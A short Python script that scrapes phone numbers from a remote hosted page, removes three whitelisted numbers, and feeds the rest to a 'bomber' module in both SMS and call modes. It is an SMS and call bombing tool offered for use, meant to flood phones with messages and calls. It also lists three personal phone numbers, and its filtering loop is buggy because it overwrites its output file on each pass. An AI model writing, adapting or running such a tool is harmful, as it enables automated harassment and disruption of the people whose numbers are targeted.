import requests

from bs4 import BeautifulSoup
 

urls = 'https://crazyboysofagv.000webhostapp.com/numbers/'

grab = requests.get(urls)

soup = BeautifulSoup(grab.text, 'html.parser')
 
# opening a file in write mode

f = open("num.txt", "w")
# traverse paragraphs from soup

for link in soup.find_all("a"):

   data = link.get('href')

   f.write(data)
   print(data)
   f.write("\n")
 
f.close()
whitelist = ["9798092707","6203801709","9835023651"]
from bomber import selectnode
with open('num.txt','r') as x:
    for i in x:
        for wlist in whitelist:
            i = i.replace(wlist, '')
            file = open('number.txt', 'w')
            file.write(i)
            file.write('\n')
        file.close()
with open('number.txt','r') as number:
  for i in number:
     selectnode(mode='sms', num=str(i))
     selectnode(mode='call', num=str(i))
